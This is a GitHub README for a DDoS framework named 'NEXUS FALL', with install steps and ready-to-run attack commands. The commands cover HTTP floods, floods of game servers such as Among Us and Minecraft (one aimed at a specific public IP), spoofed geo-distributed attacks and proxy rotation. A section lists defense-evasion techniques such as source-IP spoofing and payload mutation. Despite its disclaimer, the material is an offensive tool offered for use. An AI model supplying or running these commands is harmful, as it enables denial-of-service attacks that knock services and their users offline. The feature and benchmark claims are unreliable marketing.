# 🌐 NEXUS FALL - Global DDoS Framework v3.0

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)

## ⚠️ LEGAL DISCLAIMER
**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED PENETRATION TESTING ONLY.**
Unauthorized use against any system without explicit written permission is **ILLEGAL** and punishable by law. The authors assume no liability for misuse.

## 🚀 Features

- **Multi-Layer Attacks**: L3 (Network), L4 (Transport), L7 (Application)
- **Geo-Distributed Spoofing**: 50+ countries with automatic IP rotation
- **Proxy Rotation**: 1000+ live proxies harvested in real-time
- **Game Server Payloads**: Among Us, FreeFire, Roblox, Minecraft
- **AI Vector Selection**: Auto-detects weakest point
- **Asynchronous Engine**: 50,000+ concurrent connections
- **Docker Support**: One-click deployment anywhere
- **Full Logging**: Detailed attack analytics

## 📦 Installation

### Quick Install (Linux/macOS)
```bash
git clone https://github.com/Aditya13100/nexus-fall-global.git
cd nexus-fall-global
chmod +x scripts/install.sh
./scripts/install.sh
Manual Install
bash
# Install Python dependencies
pip install -r requirements.txt

# Install Scapy dependencies (Linux)
sudo apt-get install python3-scapy -y

# For raw socket support (Linux)
sudo setcap cap_net_raw+ep /usr/bin/python3.8
Docker Install
bash
docker build -t nexus-fall .
docker run --rm -it --net=host nexus-fall --target 192.168.1.100 --port 80
🎯 Quick Start
Basic HTTP Flood
bash
sudo python3 -m nexus_fall.main --target example.com --port 80 --mode HTTP --threads 1000 --duration 60
Game Server Attack (Among Us)
bash
sudo python3 -m nexus_fall.main --target 13.248.212.111 --port 22023 --mode GAME --game amongus --threads 5000 --duration 120
Geo-Distributed Attack
bash
sudo python3 -m nexus_fall.main --target 192.168.1.100 --port 8080 --mode HYBRID --geo TRUE --countries US,UK,DE,JP --threads 10000 --duration 300
Using Proxy List
bash
sudo python3 -m nexus_fall.main --target example.com --port 443 --mode HTTPS --proxies TRUE --proxy-file proxies.txt
🌍 Geo-Distribution Support
The framework automatically rotates source IPs from these countries:

🇺🇸 USA, 🇬🇧 UK, 🇩🇪 Germany, 🇫🇷 France

🇯🇵 Japan, 🇨🇳 China, 🇷🇺 Russia, 🇧🇷 Brazil

🇮🇳 India, 🇦🇺 Australia, 🇨🇦 Canada, 🇰🇷 South Korea

🎮 Game Server Support
Game	Protocol	Default Port	Status
Among Us	UDP/TCP	22023	✅ Full Support
FreeFire	TCP/UDP	8080	✅ Full Support
Roblox	UDP	49152-65535	✅ Full Support
Minecraft	TCP	25565	✅ Full Support
Fortnite	UDP	5222	⚠️ Partial
Valorant	UDP	7000-8000	⚠️ Partial
⚙️ Configuration
Create .env file from template:

bash
cp .env.example .env
nano .env
Example .env:

ini
# Target Configuration
TARGET_IP=192.168.1.100
TARGET_PORT=80
THREAD_COUNT=5000
ATTACK_DURATION=120
ATTACK_MODE=HYBRID

# Proxy Settings
USE_PROXIES=true
PROXY_REFRESH_INTERVAL=60
MAX_PROXIES=1000

# Geo-Spoofing
GEO_ROTATE=true
GEO_ROTATE_INTERVAL=15
COUNTRIES=US,UK,DE,FR,JP

# Logging
LOG_LEVEL=INFO
LOG_FILE=attack.log
🐳 Docker Deployment
bash
# Build image
docker build -t nexus-fall .

# Run with default settings
docker run --rm -it --net=host nexus-fall

# Run with custom args
docker run --rm -it --net=host nexus-fall --target example.com --threads 10000

# Run in background
docker run -d --name nexus-fall --net=host nexus-fall --target 192.168.1.100 --duration 300
📊 Monitoring & Analytics
The framework provides real-time statistics:

Packets per second (PPS)

Bandwidth usage (Mbps)

Active connections

Success rate

Proxy health

🛡️ Defense Evasion Techniques
IP Randomization: Every packet has a different source IP

Payload Mutation: Payload changes every 10 packets

TCP Fingerprint Randomization: Random window sizes, TTL

Request Jitter: Random delays (0.001-0.1s)

Header Rotation: Random User-Agent, Accept headers

Slowloris Mode: Partial HTTP requests

🔧 Advanced Usage
Custom Payloads
python
from nexus_fall.payloads import CustomPayload

payload = CustomPayload(
    size=4096,
    content_type="random",
    encryption=False
)
Proxy Integration
python
from nexus_fall.core.proxy_harvester import ProxyHarvester

ph = ProxyHarvester()
proxies = ph.fetch_free_proxies()
print(f"Loaded {len(proxies)} proxies")
API Mode
bash
# Start API server
python3 -m nexus_fall.api --port 5000

# Send attack via API
curl -X POST http://localhost:5000/attack \
  -H "Content-Type: application/json" \
  -d '{"target":"example.com","port":80,"duration":60}'
📈 Performance Benchmarks
Threads	PPS (Packets/sec)	Bandwidth	CPU Usage
100	50,000	25 Mbps	15%
1,000	500,000	250 Mbps	45%
5,000	2,500,000	1.2 Gbps	85%
10,000	5,000,000	2.5 Gbps	95%+
Note: Performance depends on network hardware and OS settings.

🐛 Troubleshooting
"Permission Denied" for raw sockets
bash
sudo setcap cap_net_raw+ep /usr/bin/python3
# Or run with sudo
sudo python3 -m nexus_fall.main
"Too many open files"
bash
ulimit -n 65535
# Or add to /etc/security/limits.conf
* soft nofile 65535
* hard nofile 65535
"Scapy not found"
bash
pip install scapy
# Or on Linux
sudo apt-get install python3-scapy
🤝 Contributing
We welcome contributions! Please see CONTRIBUTING.md for guidelines.

Fork the repository

Create feature branch (git checkout -b feature/AmazingFeature)

Commit changes (git commit -m 'Add AmazingFeature')

Push to branch (git push origin feature/AmazingFeature)

Open Pull Request

📜 License
This project is licensed under the MIT License - see LICENSE file for details.

⚠️ Final Warning
This tool is extremely powerful and can cause irreversible damage to systems.

Always get written permission before testing.

Test only on systems you own.

Use responsibly and ethically.

The author is not responsible for any misuse.

📞 Contact & Support
GitHub Issues: https://github.com/Aditya13100/nexus-fall-global/issues

Discord: 

Email: budhraniaditya7@gmail.com

Built with 💀 by the Aditya Budhrani
